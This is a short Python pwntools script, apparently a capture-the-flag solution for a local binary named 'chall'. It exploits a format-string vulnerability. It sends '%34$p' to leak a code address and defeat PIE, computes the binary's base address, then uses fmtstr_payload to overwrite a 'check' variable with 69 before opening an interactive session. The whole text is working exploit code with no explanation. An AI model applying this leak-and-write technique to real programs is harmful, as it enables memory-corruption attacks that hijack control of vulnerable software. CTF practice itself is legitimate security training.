from pwn import *
context.binary = binary = ELF("./chall")
rop = ROP(binary)
p = process()
#gdb.attach(p, gdbscript="continue", terminal=["tmux", "splitw", "-h"])
main = binary.sym['main']

p.recvuntil("\n")
p.sendline("%34$p")

pie_leak = int(p.recvline().decode("utf-8").split(" ")[1], 16)

print(hex(pie_leak - main))

binary.address = pie_leak - main

print(hex(binary.address))

password = binary.sym['check']

print("password: " + hex(password))

payload = fmtstr_payload(6, {password: 69})

p.sendline(payload)

p.interactive()

